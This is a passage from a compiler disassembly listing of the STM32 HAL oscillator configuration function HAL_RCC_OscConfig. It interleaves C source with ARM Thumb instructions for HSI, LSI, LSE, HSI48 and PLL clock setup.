 8003bfe:	681b      	ldr	r3, [r3, #0]
 8003c00:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c04:	2b00      	cmp	r3, #0
 8003c06:	d0f0      	beq.n	8003bea <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003c08:	4b62      	ldr	r3, [pc, #392]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c0a:	685b      	ldr	r3, [r3, #4]
 8003c0c:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c10:	687b      	ldr	r3, [r7, #4]
 8003c12:	691b      	ldr	r3, [r3, #16]
 8003c14:	061b      	lsls	r3, r3, #24
 8003c16:	495f      	ldr	r1, [pc, #380]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c18:	4313      	orrs	r3, r2
 8003c1a:	604b      	str	r3, [r1, #4]
 8003c1c:	e018      	b.n	8003c50 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003c1e:	4b5d      	ldr	r3, [pc, #372]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c20:	681b      	ldr	r3, [r3, #0]
 8003c22:	4a5c      	ldr	r2, [pc, #368]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c24:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003c28:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c2a:	f7fd faad 	bl	8001188 <HAL_GetTick>
 8003c2e:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c30:	e008      	b.n	8003c44 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c32:	f7fd faa9 	bl	8001188 <HAL_GetTick>
 8003c36:	4602      	mov	r2, r0
 8003c38:	693b      	ldr	r3, [r7, #16]
 8003c3a:	1ad3      	subs	r3, r2, r3
 8003c3c:	2b02      	cmp	r3, #2
 8003c3e:	d901      	bls.n	8003c44 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003c40:	2303      	movs	r3, #3
 8003c42:	e231      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c44:	4b53      	ldr	r3, [pc, #332]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c46:	681b      	ldr	r3, [r3, #0]
 8003c48:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c4c:	2b00      	cmp	r3, #0
 8003c4e:	d1f0      	bne.n	8003c32 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003c50:	687b      	ldr	r3, [r7, #4]
 8003c52:	681b      	ldr	r3, [r3, #0]
 8003c54:	f003 0308 	and.w	r3, r3, #8
 8003c58:	2b00      	cmp	r3, #0
 8003c5a:	d03c      	beq.n	8003cd6 <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003c5c:	687b      	ldr	r3, [r7, #4]
 8003c5e:	695b      	ldr	r3, [r3, #20]
 8003c60:	2b00      	cmp	r3, #0
 8003c62:	d01c      	beq.n	8003c9e <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003c64:	4b4b      	ldr	r3, [pc, #300]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c66:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c6a:	4a4a      	ldr	r2, [pc, #296]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c6c:	f043 0301 	orr.w	r3, r3, #1
 8003c70:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003c74:	f7fd fa88 	bl	8001188 <HAL_GetTick>
 8003c78:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003c7a:	e008      	b.n	8003c8e <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003c7c:	f7fd fa84 	bl	8001188 <HAL_GetTick>
 8003c80:	4602      	mov	r2, r0
 8003c82:	693b      	ldr	r3, [r7, #16]
 8003c84:	1ad3      	subs	r3, r2, r3
 8003c86:	2b02      	cmp	r3, #2
 8003c88:	d901      	bls.n	8003c8e <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003c8a:	2303      	movs	r3, #3
 8003c8c:	e20c      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003c8e:	4b41      	ldr	r3, [pc, #260]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003c90:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c94:	f003 0302 	and.w	r3, r3, #2
 8003c98:	2b00      	cmp	r3, #0
 8003c9a:	d0ef      	beq.n	8003c7c <HAL_RCC_OscConfig+0x3ec>
 8003c9c:	e01b      	b.n	8003cd6 <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003c9e:	4b3d      	ldr	r3, [pc, #244]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003ca0:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003ca4:	4a3b      	ldr	r2, [pc, #236]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003ca6:	f023 0301 	bic.w	r3, r3, #1
 8003caa:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003cae:	f7fd fa6b 	bl	8001188 <HAL_GetTick>
 8003cb2:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003cb4:	e008      	b.n	8003cc8 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003cb6:	f7fd fa67 	bl	8001188 <HAL_GetTick>
 8003cba:	4602      	mov	r2, r0
 8003cbc:	693b      	ldr	r3, [r7, #16]
 8003cbe:	1ad3      	subs	r3, r2, r3
 8003cc0:	2b02      	cmp	r3, #2
 8003cc2:	d901      	bls.n	8003cc8 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003cc4:	2303      	movs	r3, #3
 8003cc6:	e1ef      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003cc8:	4b32      	ldr	r3, [pc, #200]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003cca:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cce:	f003 0302 	and.w	r3, r3, #2
 8003cd2:	2b00      	cmp	r3, #0
 8003cd4:	d1ef      	bne.n	8003cb6 <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003cd6:	687b      	ldr	r3, [r7, #4]
 8003cd8:	681b      	ldr	r3, [r3, #0]
 8003cda:	f003 0304 	and.w	r3, r3, #4
 8003cde:	2b00      	cmp	r3, #0
 8003ce0:	f000 80a6 	beq.w	8003e30 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003ce4:	2300      	movs	r3, #0
 8003ce6:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003ce8:	4b2a      	ldr	r3, [pc, #168]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003cea:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003cec:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003cf0:	2b00      	cmp	r3, #0
 8003cf2:	d10d      	bne.n	8003d10 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003cf4:	4b27      	ldr	r3, [pc, #156]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003cf6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003cf8:	4a26      	ldr	r2, [pc, #152]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003cfa:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003cfe:	6593      	str	r3, [r2, #88]	; 0x58
 8003d00:	4b24      	ldr	r3, [pc, #144]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d02:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003d04:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003d08:	60bb      	str	r3, [r7, #8]
 8003d0a:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003d0c:	2301      	movs	r3, #1
 8003d0e:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d10:	4b21      	ldr	r3, [pc, #132]	; (8003d98 <HAL_RCC_OscConfig+0x508>)
 8003d12:	681b      	ldr	r3, [r3, #0]
 8003d14:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d18:	2b00      	cmp	r3, #0
 8003d1a:	d118      	bne.n	8003d4e <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003d1c:	4b1e      	ldr	r3, [pc, #120]	; (8003d98 <HAL_RCC_OscConfig+0x508>)
 8003d1e:	681b      	ldr	r3, [r3, #0]
 8003d20:	4a1d      	ldr	r2, [pc, #116]	; (8003d98 <HAL_RCC_OscConfig+0x508>)
 8003d22:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003d26:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003d28:	f7fd fa2e 	bl	8001188 <HAL_GetTick>
 8003d2c:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d2e:	e008      	b.n	8003d42 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003d30:	f7fd fa2a 	bl	8001188 <HAL_GetTick>
 8003d34:	4602      	mov	r2, r0
 8003d36:	693b      	ldr	r3, [r7, #16]
 8003d38:	1ad3      	subs	r3, r2, r3
 8003d3a:	2b02      	cmp	r3, #2
 8003d3c:	d901      	bls.n	8003d42 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003d3e:	2303      	movs	r3, #3
 8003d40:	e1b2      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d42:	4b15      	ldr	r3, [pc, #84]	; (8003d98 <HAL_RCC_OscConfig+0x508>)
 8003d44:	681b      	ldr	r3, [r3, #0]
 8003d46:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d4a:	2b00      	cmp	r3, #0
 8003d4c:	d0f0      	beq.n	8003d30 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003d4e:	687b      	ldr	r3, [r7, #4]
 8003d50:	689b      	ldr	r3, [r3, #8]
 8003d52:	2b01      	cmp	r3, #1
 8003d54:	d108      	bne.n	8003d68 <HAL_RCC_OscConfig+0x4d8>
 8003d56:	4b0f      	ldr	r3, [pc, #60]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d58:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d5c:	4a0d      	ldr	r2, [pc, #52]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d5e:	f043 0301 	orr.w	r3, r3, #1
 8003d62:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d66:	e029      	b.n	8003dbc <HAL_RCC_OscConfig+0x52c>
 8003d68:	687b      	ldr	r3, [r7, #4]
 8003d6a:	689b      	ldr	r3, [r3, #8]
 8003d6c:	2b05      	cmp	r3, #5
 8003d6e:	d115      	bne.n	8003d9c <HAL_RCC_OscConfig+0x50c>
 8003d70:	4b08      	ldr	r3, [pc, #32]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d72:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d76:	4a07      	ldr	r2, [pc, #28]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d78:	f043 0304 	orr.w	r3, r3, #4
 8003d7c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d80:	4b04      	ldr	r3, [pc, #16]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d82:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d86:	4a03      	ldr	r2, [pc, #12]	; (8003d94 <HAL_RCC_OscConfig+0x504>)
 8003d88:	f043 0301 	orr.w	r3, r3, #1
 8003d8c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d90:	e014      	b.n	8003dbc <HAL_RCC_OscConfig+0x52c>
 8003d92:	bf00      	nop
 8003d94:	40021000 	.word	0x40021000
 8003d98:	40007000 	.word	0x40007000
 8003d9c:	4b9a      	ldr	r3, [pc, #616]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003d9e:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003da2:	4a99      	ldr	r2, [pc, #612]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003da4:	f023 0301 	bic.w	r3, r3, #1
 8003da8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003dac:	4b96      	ldr	r3, [pc, #600]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003dae:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003db2:	4a95      	ldr	r2, [pc, #596]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003db4:	f023 0304 	bic.w	r3, r3, #4
 8003db8:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003dbc:	687b      	ldr	r3, [r7, #4]
 8003dbe:	689b      	ldr	r3, [r3, #8]
 8003dc0:	2b00      	cmp	r3, #0
 8003dc2:	d016      	beq.n	8003df2 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003dc4:	f7fd f9e0 	bl	8001188 <HAL_GetTick>
 8003dc8:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003dca:	e00a      	b.n	8003de2 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003dcc:	f7fd f9dc 	bl	8001188 <HAL_GetTick>
 8003dd0:	4602      	mov	r2, r0
 8003dd2:	693b      	ldr	r3, [r7, #16]
 8003dd4:	1ad3      	subs	r3, r2, r3
 8003dd6:	f241 3288 	movw	r2, #5000	; 0x1388
 8003dda:	4293      	cmp	r3, r2
 8003ddc:	d901      	bls.n	8003de2 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003dde:	2303      	movs	r3, #3
 8003de0:	e162      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003de2:	4b89      	ldr	r3, [pc, #548]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003de4:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003de8:	f003 0302 	and.w	r3, r3, #2
 8003dec:	2b00      	cmp	r3, #0
 8003dee:	d0ed      	beq.n	8003dcc <HAL_RCC_OscConfig+0x53c>
 8003df0:	e015      	b.n	8003e1e <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003df2:	f7fd f9c9 	bl	8001188 <HAL_GetTick>
 8003df6:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003df8:	e00a      	b.n	8003e10 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003dfa:	f7fd f9c5 	bl	8001188 <HAL_GetTick>
 8003dfe:	4602      	mov	r2, r0
 8003e00:	693b      	ldr	r3, [r7, #16]
 8003e02:	1ad3      	subs	r3, r2, r3
 8003e04:	f241 3288 	movw	r2, #5000	; 0x1388
 8003e08:	4293      	cmp	r3, r2
 8003e0a:	d901      	bls.n	8003e10 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003e0c:	2303      	movs	r3, #3
 8003e0e:	e14b      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e10:	4b7d      	ldr	r3, [pc, #500]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e12:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e16:	f003 0302 	and.w	r3, r3, #2
 8003e1a:	2b00      	cmp	r3, #0
 8003e1c:	d1ed      	bne.n	8003dfa <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003e1e:	7ffb      	ldrb	r3, [r7, #31]
 8003e20:	2b01      	cmp	r3, #1
 8003e22:	d105      	bne.n	8003e30 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003e24:	4b78      	ldr	r3, [pc, #480]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e26:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003e28:	4a77      	ldr	r2, [pc, #476]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e2a:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003e2e:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003e30:	687b      	ldr	r3, [r7, #4]
 8003e32:	681b      	ldr	r3, [r3, #0]
 8003e34:	f003 0320 	and.w	r3, r3, #32
 8003e38:	2b00      	cmp	r3, #0
 8003e3a:	d03c      	beq.n	8003eb6 <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003e3c:	687b      	ldr	r3, [r7, #4]
 8003e3e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003e40:	2b00      	cmp	r3, #0
 8003e42:	d01c      	beq.n	8003e7e <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003e44:	4b70      	ldr	r3, [pc, #448]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e46:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e4a:	4a6f      	ldr	r2, [pc, #444]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e4c:	f043 0301 	orr.w	r3, r3, #1
 8003e50:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e54:	f7fd f998 	bl	8001188 <HAL_GetTick>
 8003e58:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e5a:	e008      	b.n	8003e6e <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e5c:	f7fd f994 	bl	8001188 <HAL_GetTick>
 8003e60:	4602      	mov	r2, r0
 8003e62:	693b      	ldr	r3, [r7, #16]
 8003e64:	1ad3      	subs	r3, r2, r3
 8003e66:	2b02      	cmp	r3, #2
 8003e68:	d901      	bls.n	8003e6e <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003e6a:	2303      	movs	r3, #3
 8003e6c:	e11c      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e6e:	4b66      	ldr	r3, [pc, #408]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e70:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e74:	f003 0302 	and.w	r3, r3, #2
 8003e78:	2b00      	cmp	r3, #0
 8003e7a:	d0ef      	beq.n	8003e5c <HAL_RCC_OscConfig+0x5cc>
 8003e7c:	e01b      	b.n	8003eb6 <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003e7e:	4b62      	ldr	r3, [pc, #392]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e80:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e84:	4a60      	ldr	r2, [pc, #384]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003e86:	f023 0301 	bic.w	r3, r3, #1
 8003e8a:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e8e:	f7fd f97b 	bl	8001188 <HAL_GetTick>
 8003e92:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003e94:	e008      	b.n	8003ea8 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e96:	f7fd f977 	bl	8001188 <HAL_GetTick>
 8003e9a:	4602      	mov	r2, r0
 8003e9c:	693b      	ldr	r3, [r7, #16]
 8003e9e:	1ad3      	subs	r3, r2, r3
 8003ea0:	2b02      	cmp	r3, #2
 8003ea2:	d901      	bls.n	8003ea8 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003ea4:	2303      	movs	r3, #3
 8003ea6:	e0ff      	b.n	80040a8 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003ea8:	4b57      	ldr	r3, [pc, #348]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003eaa:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003eae:	f003 0302 	and.w	r3, r3, #2
 8003eb2:	2b00      	cmp	r3, #0
 8003eb4:	d1ef      	bne.n	8003e96 <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003eb6:	687b      	ldr	r3, [r7, #4]
 8003eb8:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003eba:	2b00      	cmp	r3, #0
 8003ebc:	f000 80f3 	beq.w	80040a6 <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003ec0:	687b      	ldr	r3, [r7, #4]
 8003ec2:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003ec4:	2b02      	cmp	r3, #2
 8003ec6:	f040 80c9 	bne.w	800405c <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003eca:	4b4f      	ldr	r3, [pc, #316]	; (8004008 <HAL_RCC_OscConfig+0x778>)
 8003ecc:	68db      	ldr	r3, [r3, #12]
 8003ece:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003ed0:	697b      	ldr	r3, [r7, #20]
 8003ed2:	f003 0203 	and.w	r2, r3, #3
 8003ed6:	687b      	ldr	r3, [r7, #4]
 8003ed8:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003eda:	429a      	cmp	r2, r3
 8003edc:	d12c      	bne.n	8003f38 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003ede:	697b      	ldr	r3, [r7, #20]
 8003ee0:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003ee4:	687b      	ldr	r3, [r7, #4]
 8003ee6:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003ee8:	3b01      	subs	r3, #1
 8003eea:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003eec:	429a      	cmp	r2, r3
 8003eee:	d123      	bne.n	8003f38 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003ef0:	697b      	ldr	r3, [r7, #20]
 8003ef2:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003ef6:	687b      	ldr	r3, [r7, #4]
 8003ef8:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003efa:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003efc:	429a      	cmp	r2, r3
 8003efe:	d11b      	bne.n	8003f38 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f00:	697b      	ldr	r3, [r7, #20]
 8003f02:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 8003f06:	687b      	ldr	r3, [r7, #4]
 8003f08:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003f0a:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f0c:	429a      	cmp	r2, r3
 8003f0e:	d113      	bne.n	8003f38 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f10:	697b      	ldr	r3, [r7, #20]
